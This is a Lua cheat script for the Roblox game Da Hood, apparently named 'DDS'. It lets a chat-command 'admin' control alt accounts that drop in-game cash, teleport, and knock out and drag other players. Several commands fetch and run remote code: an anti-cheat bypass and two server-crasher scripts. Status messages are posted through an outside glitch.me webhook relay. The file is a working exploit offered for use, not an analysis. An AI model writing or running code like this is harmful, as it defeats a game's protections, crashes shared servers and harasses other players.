local admin = getgenv().admin

local bringer = getgenv().bringer

local prefix = getgenv().prefix
local crasher = getgenv().crasher

local adverbmsg = getgenv().adverbmsg

local alts = getgenv().alts

local fps = getgenv().fps

local webhook = getgenv().webhook

local adminpositions = {{-870,-38,-550},{-870,-38,-570},{-870,-38,-590},{-870,-38,-610},{-900,-38,-550},{-900,-38,-570},{-900,-38,-590},{-900,-38,-610},{-910,-38,-550},{-910,-38,-570},{-910,-38,-590},{-910,-38,-610},{-820,-38,-550},{-820,-38,-570},{-820,-38,-590},{-820,-38,-610},{-810,-38,-550},{-810,-38,-570},{-810,-38,-590},{-810,-38,-610},{-870,-45,-550},{-870,-45,-570},{-870,-45,-590},{-870,-45,-610},{-900,-45,-550},{-900,-45,-570},{-900,-45,-590},{-900,-45,-610},{-910,-45,-550},{-910,-45,-570},{-910,-45,-590},{-910,-45,-610},{-820,-45,-550},{-820,-45,-570},{-820,-45,-590},{-820,-45,-610},{-810,-45,-550},{-810,-45,-570},{-810,-45,-590},{-810,-45,-610}}local BringLocations = {
	["bank"] = CFrame.new(-396.988922, 21.7570763, -293.929779, -0.102468058, -1.9584887e-09, -0.994736314, 7.23731564e-09, 1, -2.71436984e-09, 0.994736314, -7.47735651e-09, -0.102468058),
	["admin"] = CFrame.new(-872.453674, -32.6421318, -532.476379, 0.999682248, -1.36019978e-08, 0.0252073351, 1.33811247e-08, 1, 8.93094043e-09, -0.0252073351, -8.59080007e-09, 0.999682248),
	["klub"] = CFrame.new(-264.434479, 0.0355005264, -430.854736, -0.999828756, 9.58909574e-09, -0.0185054261, 9.92017934e-09, 1, -1.77993904e-08, 0.0185054261, -1.79799198e-08, -0.999828756),	
	["vault"] = CFrame.new(-495.485901, 23.1428547, -284.661713, -0.0313318223, -4.10440322e-08, 0.999509037, 2.18453966e-08, 1, 4.17489829e-08, -0.999509037, 2.31427428e-08, -0.0313318223),
	["train"] = CFrame.new(591.396118, 34.5070686, -146.159561, 0.0698467195, -4.91725913e-08, -0.997557759, 5.03374231e-08, 1, -4.57684664e-08, 0.997557759, -4.70177071e-08, 0.0698467195),	
}

if not game:IsLoaded() then
    game.Loaded:Wait();
end


		
game.StarterGui:SetCore("SendNotification", {
        Title = "DDS";
        Text = "DDS has loaded!";
        Duration = 100;
    })

local adverb = false

local dropping = false
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local Plr = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService");
local vu = game:GetService("VirtualUser")

local bringname = ""
local bringnamemoving = false

game:GetService("Players").LocalPlayer.Idled:connect(function()
vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
wait(1)
vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)


local players, replicatedStorage = game:GetService("Players"), game:GetService("ReplicatedStorage");
local defaultChatSystemChatEvents = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents");

local onMessageDoneFiltering = defaultChatSystemChatEvents:FindFirstChild("OnMessageDoneFiltering");

local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)

if table.find(alts, player.name) then
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("[DDS] Loaded","All")
game:GetService("RunService"):Set3dRenderingEnabled(false)
setfpscap(fps)
if player.name != bringer then
if game.Players.LocalPlayer.Character.BodyEffects:FindFirstChild("Attacking") then
        game.Players.LocalPlayer.Character.BodyEffects:FindFirstChild("Attacking"):Destroy()
end
end
end
print("Loaded DDS")
local withlimit = false
local CmdSettings = {}
getgenv().cashdropped = 0
local stopcash = 0




function SendMessage(Webhook, Message, Botname)
   local Name;
   local WakeUp = game:HttpGet("http://buritoman69.glitch.me");
   local API = "http://buritoman69.glitch.me/webhook";
   local Body = {
       ['Key'] = tostring("applesaregood"),
       ['Message'] = tostring(Message),
       ['Name'] = Name,
       ['Webhook'] = Webhook    
   }
   Body = HttpService:JSONEncode(Body);
   local Data = game:GetService("HttpService"):PostAsync(API, Body, false, "application/json")
   return Data or nil;
end

local function GetPlayerFromString(str,ignore)
	for i,Targ in pairs(game.Players:GetPlayers()) do 
		if not ignore and Targ == Players then
			continue
		end
		if Targ.Name:lower():sub(1,#str) == str:lower() or  Targ.DisplayName:lower():sub(1,#str) == str:lower()  then
			return Targ
		end
	end
	return nil
end
coroutine.wrap(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MsorkyScripts/OpenSourceAntiCheat/main/AntiCheatBypass.txt"))()
end)()


function BringPlr(Target,POS)
	if Target.Character and Target.Character:FindFirstChild("Humanoid") then
		
		
		
		
		CmdSettings["Aura"] = nil

		local enablehitting = true
		
		local TargetPlr = Target
		local Host = Players:FindFirstChild(admin)
		local c = game.Players.LocalPlayer.Character
		local Root = c.HumanoidRootPart
		local PrevCF = Root.CFrame
		local TargetChar = TargetPlr.Character
		
		local currentPos = Root.CFrame
		
		if TargetPlr and TargetPlr.Character and TargetPlr.Character:FindFirstChild("Humanoid") and not ( not c or not c:FindFirstChild("BodyEffects") or not c.BodyEffects:FindFirstChild("K.O") or not c.BodyEffects:FindFirstChild("Grabbed")  or c.BodyEffects["K.O"].Value == true or c.BodyEffects.Grabbed.Value ~= nil or not TargetChar or not TargetChar:FindFirstChild("BodyEffects") or not TargetChar.BodyEffects:FindFirstChild("K.O") or TargetChar.BodyEffects["K.O"].Value == true ) then
			CmdSettings["IsLocking"] = true

			c.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false)

			Root.CFrame = CFrame.new(TargetChar.HumanoidRootPart.Position)*CFrame.new(0,0,1)

			repeat wait()
				Root.CFrame = CFrame.new(TargetChar.HumanoidRootPart.Position)*CFrame.new(0,0,1)
				if not c:FindFirstChild("Combat") then
					c.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.Combat)     
				end
				c.Combat:Activate()
			
			until not TargetPlr or not TargetChar or not c or not c:FindFirstChild("BodyEffects") or not c.BodyEffects:FindFirstChild("K.O") or not c.BodyEffects:FindFirstChild("Grabbed")  or c.BodyEffects["K.O"].Value == true or c.BodyEffects.Grabbed.Value ~= nil or not TargetChar or not TargetChar:FindFirstChild("BodyEffects") or not TargetChar.BodyEffects:FindFirstChild("K.O") or TargetChar.BodyEffects["K.O"].Value == true		
			Root.CFrame = CFrame.new(TargetChar.LowerTorso.Position)*CFrame.new(0,3,0)
			if c.BodyEffects.Grabbed.Value ~= nil then

			else
				if not (not TargetPlr or not TargetChar or not c or not c:FindFirstChild("BodyEffects") or not c.BodyEffects:FindFirstChild("K.O") or not c.BodyEffects:FindFirstChild("Grabbed")  or c.BodyEffects["K.O"].Value == true or c.BodyEffects.Grabbed.Value ~= nil or not TargetChar or not TargetChar:FindFirstChild("BodyEffects") or not TargetChar.BodyEffects:FindFirstChild("K.O") or TargetChar.BodyEffects["K.O"].Value == false ) then
					local args = {
						[1] = "Grabbing",
						[2] = false
					}

					game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
				end

			end
			repeat wait(0.35)
				if not (not TargetPlr or not TargetChar or not c or not c:FindFirstChild("BodyEffects") or not c.BodyEffects:FindFirstChild("K.O") or not c.BodyEffects:FindFirstChild("Grabbed")  or c.BodyEffects["K.O"].Value == true or c.BodyEffects.Grabbed.Value ~= nil or not TargetChar or not TargetChar:FindFirstChild("BodyEffects") or not TargetChar.BodyEffects:FindFirstChild("K.O") or TargetChar.BodyEffects["K.O"].Value == false ) then
					Root.CFrame = CFrame.new(TargetChar.LowerTorso.Position)*CFrame.new(0,3,0)
					if c.BodyEffects.Grabbed.Value ~= nil then

					else
						if not (not TargetPlr or not TargetChar or not c or not c:FindFirstChild("BodyEffects") or c.BodyEffects["K.O"].Value == true or c.BodyEffects.Grabbed.Value ~= nil or not TargetChar or not TargetChar:FindFirstChild("BodyEffects") or TargetChar.BodyEffects["K.O"].Value == false)  then
							local args = {
								[1] = "Grabbing",
								[2] = false
							}
							game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
						end
					end
				end
			until not TargetPlr or not TargetChar or not c or not c:FindFirstChild("BodyEffects") or not c.BodyEffects:FindFirstChild("K.O") or not c.BodyEffects:FindFirstChild("Grabbed")  or c.BodyEffects["K.O"].Value == true or c.BodyEffects.Grabbed.Value ~= nil or not TargetChar or not TargetChar:FindFirstChild("BodyEffects") or not TargetChar.BodyEffects:FindFirstChild("K.O") or TargetChar.BodyEffects["K.O"].Value == false 
			if POS == nil then
				Root.CFrame = Host.Character.HumanoidRootPart.CFrame
			else
				Root.CFrame = POS
			end
			CmdSettings["IsLocking"] = nil
			wait(1.5)
			local args = {
				[1] = "Grabbing",
				[2] = false
			}

			game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))

			wait(0.5)
			Root.CFrame = currentPos
			player.Character.HumanoidRootPart.Rotation = Vector3.new(0,0,0)
			wait(0.1)
			game.Players.LocalPlayer.Character.Head.Anchored = true
			
		end
	end
end

    Players.PlayerAdded:Connect(function(player)
        game.StarterGui:SetCore("SendNotification", {
            Title = "Someone joined!",
            Text = player.name .. " joined the game.",
            Duration = 15
        })
    end)

local function onChatted(p,msg)
    local Args = string.split(msg," ")
    local adminPlayer = Players:FindFirstChild(admin)
    local premium = adminPlayer:GetRankInGroup(16402091) >= 2
    if premium == false then
    print("You have not bought Premium!")
    return 
    end
    
    
    if player.name==admin then
         if msg:match(prefix.."tpto") then
	    local targetPlayer = GetPlayerFromString(string.split(msg," ")[2])
	    if targetPlayer then
	    Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
	    else
	    Players.LocalPlayer.Character.HumanoidRootPart.CFrame = BringLocations[Args[2]]	
	    end
            
            Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
        end
         if msg:match(prefix.."cashcounter") then
	loadstring(game:HttpGet('https://raw.githubusercontent.com/GS21Official/Seller-Tools/main/DaHood%20Cash%20Counter'))()
        end	
         if msg:match(prefix.."sellinggui") then
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Crostide/cdhc/main/gui"))()
        end
	if msg:match(prefix.."crash2") then	
	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
	end
	if msg:match(prefix.."godme") then
	if game.Players.LocalPlayer.Character.BodyEffects:FindFirstChild("Attacking") then
        game.Players.LocalPlayer.Character.BodyEffects:FindFirstChild("Attacking"):Destroy()
	end
	end
     return
    end
     
    if p.name==admin then

        if msg == prefix.."drop" then
	    if player.name == crasher then return end
            withlimit = false
            dropping = true
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Start","All")
	    c.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,true)
        end
        if msg:match(prefix.."fps") then
           setfpscap(tonumber(string.split(msg," ")[2]))
           game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("FPS set to "..string.split(msg," ")[2],"All")
        end
        if msg:match(prefix.."cdrop") then
	            if player.name == crasher then return end
            stopcash = string.gsub(string.split(msg," ")[2], "mil", "000000")
            stopcash = string.gsub(stopcash, "k", "000")
            stopcash = tonumber(stopcash)
            withlimit = true
            dropping = true
            print("Started dropping "..stopcash)
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Start","All")
        end
        if msg == prefix.."dance" then
            game:GetService("Players"):Chat("/e dance2")
        end
        if msg == prefix.."advert" then
            adverb = not adverb
            while adverb do
    		print("Adverb enabled")
    		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(adverbmsg,"All")
    		wait(9.5)
		end
        end
        if msg == prefix.."stop" then
            dropping = false
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("End","All")
            cashdropped = 0
            print("Stopped")
        end
         if msg == prefix.."dropped" then
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(getgenv().cashdropped.."$","All")
        end
         if msg == prefix.."showscreen" then
            game:GetService("RunService"):Set3dRenderingEnabled(true)
        end
        if msg == prefix.."crash" then
            if player.name == crasher then
                loadstring(game:HttpGet('https://raw.githubusercontent.com/BetterDaHood/BetterDaHoodCrasher/main/Crash'))()
            end
        end
        if msg:match(prefix.."wallet") then
            print(string.split(msg," ")[2])
            if string.split(msg," ")[2] == "show" then
                    if Plr.Backpack:FindFirstChild("Wallet") and Plr.Character:FindFirstChild("Wallet") == nil then
                        local tool = Plr.Backpack:FindFirstChild("Wallet")
                        Plr.Character.Humanoid:EquipTool(tool)
                    end
            end
            if string.split(msg," ")[2] == "hide" then
                    if Plr.Backpack:FindFirstChild("Combat") and Plr.Character:FindFirstChild("Combat") == nil then
                        local tool = Plr.Backpack:FindFirstChild("Combat")
                        Plr.Character.Humanoid:EquipTool(tool)
                    end
            end
        end
        if msg == prefix.."airlock" then
	   if game.Players.LocalPlayer.name != crasher then
           game.Players.LocalPlayer.Character.Head.Anchored = false
           player.Character.HumanoidRootPart.Position = Vector3.new(player.Character.HumanoidRootPart.Position.X, player.Character.HumanoidRootPart.Position.Y+5, player.Character.HumanoidRootPart.Position.Z)
	   wait(0.1)
	   game.Players.LocalPlayer.Character.Head.Anchored = true
	end
        end
        if msg == prefix.."unlock" then
           game.Players.LocalPlayer.Character.Head.Anchored = false
        end
        if msg == prefix.."lock" then
           if game.Players.LocalPlayer.name != crasher then
           game.Players.LocalPlayer.Character.Head.Anchored = true
	   player.Character.HumanoidRootPart.Rotation = Vector3.new(0,0,0)
	   end
        end
	if msg:match(prefix.."ground") then
	if game.Players.LocalPlayer.name != crasher then
           game.Players.LocalPlayer.Character.Head.Anchored = false
           player.Character.HumanoidRootPart.Position = Vector3.new(player.Character.HumanoidRootPart.Position.X, player.Character.HumanoidRootPart.Position.Y-5, player.Character.HumanoidRootPart.Position.Z)
	   wait(0.1)
	   game.Players.LocalPlayer.Character.Head.Anchored = true		
	end
        end
        if msg == prefix.."host" then
            print("Moving to admin.")
	game.Players.LocalPlayer.Character.Head.Anchored = false
            local targetPlayer = Players:FindFirstChild(admin)
            Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
            player.Character.HumanoidRootPart.Rotation = Vector3.new(0,0,0)
			wait(0.1)
			game.Players.LocalPlayer.Character.Head.Anchored = true
        end
         if Args[1] == prefix.."bring" then
            if player.name == bringer then
	    game.Players.LocalPlayer.Character.Head.Anchored = false
            local targetHumanoid = GetPlayerFromString(Args[2])
	    if Args[3] then
	    BringPlr(targetHumanoid,BringLocations[Args[3]])		
	    else
            BringPlr(targetHumanoid,nil)
	    end
	    end
        end
        if msg:match(prefix.."setup") then
            for i, v in ipairs(alts) do
                if v == player.name then
					game.Players.LocalPlayer.Character.Head.Anchored = false
                    player.Character.HumanoidRootPart.CFrame = CFrame.new(adminpositions[i][1],adminpositions[i][2],adminpositions[i][3])
                    player.Character.HumanoidRootPart.Rotation = Vector3.new(0,0,0)
		    wait(0.1)
		    game.Players.LocalPlayer.Character.Head.Anchored = true
                end
            end
        end

end   
end

onMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
local speaker, message = players[messageData.FromSpeaker], messageData.Message
    onChatted(speaker,message)
end);
coroutine.wrap(function()
while wait() do
    if dropping == true then
    if withlimit == true then
        if stopcash > getgenv().cashdropped then
            getgenv().cashdropped = getgenv().cashdropped + 7000
            game.ReplicatedStorage.MainEvent:FireServer("DropMoney",10000)
            wait(15)
        else
            dropping = false
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("End","All")
            SendMessage(webhook, "Done dropping.", "DDS-Bot")
            getgenv().cashdropped = 0
        end
    end
    if withlimit == false then
	getgenv().cashdropped = getgenv().cashdropped + 7000
        game.ReplicatedStorage.MainEvent:FireServer("DropMoney",10000)
        wait(15)
end
end
end
end)()

--

